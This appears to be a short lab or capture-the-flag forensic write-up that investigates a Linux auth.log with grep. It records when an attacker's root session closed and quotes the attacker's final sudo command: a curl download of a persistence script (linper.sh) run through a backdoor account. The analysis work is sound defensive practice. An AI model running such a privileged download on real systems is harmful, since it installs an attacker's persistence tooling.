# Session Closure and Final Command

## Session Closure
Investigation command:

```bash
grep -n "session closed" auth.log
```

The attacker's first interactive root session ended at:

`2024-03-06 06:37:24 UTC`

## Sudo Investigation
```bash
grep -n "COMMAND=" auth.log
```

The final privileged download command was:

```text
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

## Interpretation
The attacker used the `cyberjunkie` account with root privileges to retrieve an external script. This demonstrates actual privileged post-exploitation activity, not merely possession of sudo rights.

Attack sequence:

`backdoor account -> sudo -> root context -> external script download`

## Evidence Screenshots
**Evidence 04 - Sudo Execution and Script Download**

**Evidence 05 - Root Session Closure**
